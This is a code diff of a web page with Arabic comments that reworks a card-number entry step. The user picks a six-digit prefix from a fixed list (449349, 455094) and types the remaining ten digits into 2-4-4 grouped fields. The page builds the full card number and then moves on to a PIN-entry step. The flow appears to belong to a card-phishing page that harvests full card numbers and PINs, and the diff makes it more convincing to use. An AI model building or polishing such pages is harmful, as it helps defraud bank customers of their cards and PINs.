@@ -133,9 +133,9 @@
         /* تصغير خانات البطاقة وتناسقها */
         .card-inputs {
             display: flex;
-            gap: 5px;
+            gap: 8px;
             margin-bottom: 14px;
-            flex-direction: row-reverse;
+            flex-direction: row;
             justify-content: center;
             align-items: center;
             padding: 0 2px;
@@ -143,13 +143,10 @@
         .card-inputs input, .card-inputs select {
             text-align: center;
             font-size: 15px;
-            padding: 8px 0 !important;
             direction: ltr !important;
             background: var(--input-bg);
             border: 1.2px solid #e0e0e0;
             border-radius: 7px;
-            width: 22px;
-            height: 30px;
             margin: 0;
             box-shadow: 0 2px 7px rgba(0,0,0,0.04);
             transition: border-color 0.2s;
@@ -168,6 +165,14 @@
             box-shadow: 0 2px 7px rgba(0,0,0,0.04);
             transition: border-color 0.2s;
             margin-left: 7px;
+        }
+        .card-two {
+            width: 38px;
+            padding: 8px 0 !important;
+        }
+        .card-four {
+            width: 68px;
+            padding: 8px 0 !important;
         }
         .snackbar {
             visibility: hidden;
@@ -416,7 +421,7 @@
             };
         }
 
-        // صفحة إدخال رقم البطاقة (تصميم جديد متناسق)
+        // صفحة إدخال رقم البطاقة (تصميم جديد: 2 ثم 4 ثم 4)
         function renderCardStep1() {
             cardData = {};
             document.getElementById('main').innerHTML = `
@@ -433,53 +438,58 @@
                                 <option value="449349">449349</option>
                                 <option value="455094">455094</option>
                             </select>
-                            <div id="cardInputs" style="display:flex;gap:5px;"></div>
+                            <input type="text" id="card2" maxlength="2" inputmode="numeric" pattern="\\d{2}" class="card-two" placeholder="__" autocomplete="off"/>
+                            <input type="text" id="card4a" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off"/>
+                            <input type="text" id="card4b" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off"/>
                         </div>
                         <button class="card-next-btn" type="submit">التالي</button>
                     </form>
                 </div>
             `;
-            // توليد 10 مربعات رقمية صغيرة متناسقة
-            const cardInputsDiv = document.getElementById('cardInputs');
-            for(let i=0; i<10; i++) {
-                const inp = document.createElement('input');
-                inp.type = 'text';
-                inp.inputMode = 'numeric';
-                inp.pattern = '\\d';
-                inp.maxLength = 1;
-                inp.id = 'cardDigit'+i;
-                inp.autocomplete = 'off';
-                cardInputsDiv.appendChild(inp);
-            }
-            // التنقل التلقائي بين المربعات
-            const digitInputs = Array.from(document.querySelectorAll('#cardInputs input'));
-            digitInputs.forEach((inp, idx) => {
-                inp.addEventListener('input', function(e){
-                    this.value = this.value.replace(/[^0-9]/g,'').slice(0,1);
-                    if(this.value && idx < digitInputs.length-1) digitInputs[idx+1].focus();
-                });
-                inp.addEventListener('keydown', function(e){
-                    if(e.key === 'Backspace' && !this.value && idx > 0) {
-                        digitInputs[idx-1].focus();
-                    }
-                });
+
+            // تنقل تلقائي بين الحقول
+            const c2 = document.getElementById('card2');
+            const c4a = document.getElementById('card4a');
+            const c4b = document.getElementById('card4b');
+
+            c2.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0,2);
+                if(this.value.length === 2) c4a.focus();
             });
+            c4a.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0,4);
+                if(this.value.length === 4) c4b.focus();
+            });
+            c4b.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0,4);
+            });
+
+            // Backspace التنقل للخلف
+            c4a.addEventListener('keydown', function(e){
+                if(e.key === 'Backspace' && this.value.length === 0) c2.focus();
+            });
+            c4b.addEventListener('keydown', function(e){
+                if(e.key === 'Backspace' && this.value.length === 0) c4a.focus();
+            });
+
             document.getElementById('cardStart').addEventListener('change',function(){
-                digitInputs[0].focus();
+                c2.focus();
             });
 
             document.getElementById('cardStep1Form').onsubmit = function(e){
                 e.preventDefault();
                 const cardStart = document.getElementById('cardStart').value;
-                const digits = digitInputs.map(x=>x.value).join('');
-                if(!cardStart || digits.length !== 10 || digits.includes('')) {
+                const val2 = c2.value;
+                const val4a = c4a.value;
+                const val4b = c4b.value;
+                if(!cardStart || val2.length !== 2 || val4a.length !== 4 || val4b.length !== 4) {
                     showCustomSnack('يرجى اختيار أول 6 أرقام وإدخال 10 أرقام للبطاقة.');
                     return;
                 }
                 cardData.cardStart = cardStart;
-                cardData.cardRest = digits;
-                cardData.fullCard = cardStart + digits;
-                renderCardPin(cardStart, digits);
+                cardData.cardRest = val2 + val4a + val4b;
+                cardData.fullCard = cardStart + cardData.cardRest;
+                renderCardPin(cardStart, cardData.cardRest);
             };
         }
 
